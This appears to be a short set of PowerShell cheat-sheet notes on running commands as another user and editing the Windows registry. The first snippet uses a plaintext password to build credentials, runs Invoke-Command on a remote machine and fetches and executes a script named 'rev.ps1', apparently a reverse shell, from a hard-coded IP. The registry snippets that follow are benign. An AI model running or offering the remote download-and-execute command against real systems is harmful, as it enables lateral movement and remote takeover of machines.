# run powershell commands as another user with powershell
```powershell
$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('.\user', $pass)
hostname
invoke-command -Computer ComputerHostname -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```

# powershell browse and edit registry
# powershell set registry values
```powershell
Set-ItemProperty -Path "HKLM:\Software\ContosoCompany" -Name "NoOfEmployees" -Value 823
Get-ItemProperty -Path "HKLM:\Software\ContosoCompany"
```
# powershell read registry values
can also change the powershell "directory" to the registry like "cd HKLM:\"
```powershell
cd HKLM:\SYSTEM\CurrentControlSet\Services\
```
